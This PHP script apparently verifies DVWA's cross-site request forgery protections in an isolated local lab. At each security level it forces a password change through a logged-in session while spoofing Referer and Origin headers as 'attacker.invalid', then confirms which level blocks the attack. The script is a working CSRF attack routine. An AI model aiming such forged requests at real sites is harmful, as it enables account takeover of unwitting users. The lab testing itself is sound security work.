<?php

declare(strict_types=1);

$base = 'http://127.0.0.1';
$user = getenv('DVWA_LAB_USER') ?: '';
$initialPassword = getenv('DVWA_LAB_PASSWORD') ?: '';
if ($user === '' || $initialPassword === '') {
    fwrite(STDERR, "Set sandbox-only DVWA_LAB_USER and DVWA_LAB_PASSWORD.\n");
    exit(2);
}

function requestPage($c, string $url, ?array $fields = null): array
{
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_POST, $fields !== null);
    curl_setopt($c, CURLOPT_POSTFIELDS, $fields === null ? null : http_build_query($fields));
    $body = curl_exec($c);
    if ($body === false) {
        throw new RuntimeException('HTTP request failed: ' . curl_error($c));
    }
    return [$body, (int)curl_getinfo($c, CURLINFO_HTTP_CODE), (string)curl_getinfo($c, CURLINFO_EFFECTIVE_URL)];
}

function userToken(string $body): string
{
    if (!preg_match('/<input\\b[^>]*name=[\'\"]user_token[\'\"][^>]*value=[\'\"]([^\'\"]+)/i', $body, $m)) {
        throw new RuntimeException('user_token missing');
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function resetDb(string $base): void
{
    $jar = tempnam(sys_get_temp_dir(), 'dvwa-csrf-setup-');
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIEFILE => $jar,
        CURLOPT_COOKIEJAR => $jar,
        CURLOPT_USERAGENT => 'DVWA-isolated-csrf-test/1.0',
    ]);
    try {
        [$setup] = requestPage($c, $base . '/setup.php');
        [, $status] = requestPage($c, $base . '/setup.php', [
            'create_db' => 'Create / Reset Database',
            'user_token' => userToken($setup),
        ]);
        if ($status !== 200) {
            throw new RuntimeException('Isolated DB reset failed');
        }
    } finally {
        @unlink($jar);
    }
}

function loginSession(string $base, string $user, string $password): string
{
    $jar = tempnam(sys_get_temp_dir(), 'dvwa-csrf-login-');
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIEFILE => $jar,
        CURLOPT_COOKIEJAR => $jar,
        CURLOPT_USERAGENT => 'DVWA-isolated-csrf-test/1.0',
    ]);
    try {
        [$page] = requestPage($c, $base . '/login.php');
        [$body, $status, $url] = requestPage($c, $base . '/login.php', [
            'username' => $user,
            'password' => $password,
            'Login' => 'Login',
            'user_token' => userToken($page),
        ]);
        if ($status !== 200 || stripos($body, 'Login failed') !== false || str_contains($url, 'login.php')) {
            throw new RuntimeException('DVWA login failed');
        }
        foreach (curl_getinfo($c, CURLINFO_COOKIELIST) ?: [] as $line) {
            $parts = explode("\t", $line);
            if (count($parts) >= 7 && $parts[5] === 'PHPSESSID' && preg_match('/^[A-Za-z0-9,-]+$/', $parts[6])) {
                return $parts[6];
            }
        }
        throw new RuntimeException('Authenticated session cookie missing');
    } finally {
        @unlink($jar);
    }
}

function loginWorks(string $base, string $user, string $password): bool
{
    try {
        loginSession($base, $user, $password);
        return true;
    } catch (Throwable $e) {
        return false;
    }
}

function csrfChange(string $base, string $sessionId, string $level, string $newPassword): array
{
    $url = $base . '/vulnerabilities/csrf/?' . http_build_query([
        'password_new' => $newPassword,
        'password_conf' => $newPassword,
        'Change' => 'Change',
    ]);
    $c = curl_init($url);
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_COOKIE => 'PHPSESSID=' . $sessionId . '; security=' . $level,
        CURLOPT_REFERER => 'http://attacker.invalid/csrf.html',
        CURLOPT_USERAGENT => 'DVWA-isolated-csrf-test/1.0',
        CURLOPT_HTTPHEADER => ['Origin: http://attacker.invalid'],
    ]);
    $body = curl_exec($c);
    if ($body === false) {
        throw new RuntimeException(strtoupper($level) . ' CSRF request failed: ' . curl_error($c));
    }
    return [$body, (int)curl_getinfo($c, CURLINFO_HTTP_CODE)];
}

foreach (['low', 'medium', 'high', 'impossible'] as $level) {
    resetDb($base);
    $sessionId = loginSession($base, $user, $initialPassword);
    $newPassword = 'Sandbox-CSRF-' . $level . '-' . bin2hex(random_bytes(8));
    [$body, $status] = csrfChange($base, $sessionId, $level, $newPassword);
    $changed = loginWorks($base, $user, $newPassword);
    $originalWorks = loginWorks($base, $user, $initialPassword);
    echo strtoupper($level) . " external-origin GET: HTTP={$status}; new_password_login=" . ($changed ? 'true' : 'false')
        . '; original_password_login=' . ($originalWorks ? 'true' : 'false') . '; error_marker=' . (stripos($body, 'That request') !== false ? 'present' : 'absent') . "\n";
    if ($level === 'low') {
        if (!$changed || $originalWorks) {
            throw new RuntimeException('Low CSRF state change was not confirmed');
        }
        echo "LOW_CSRF_CONFIRMED\n";
    } elseif ($level === 'medium') {
        if ($changed || !$originalWorks || stripos($body, "That request didn't look correct") === false) {
            throw new RuntimeException('Medium Referer behavior differed from source expectation');
        }
        echo "MEDIUM_REFERER_CHECK_CONFIRMED\n";
    } else {
        if ($changed || !$originalWorks) {
            throw new RuntimeException(strtoupper($level) . ' missing-token request changed password');
        }
        echo strtoupper($level) . "_TOKEN_REQUIRED_CONFIRMED\n";
    }
}
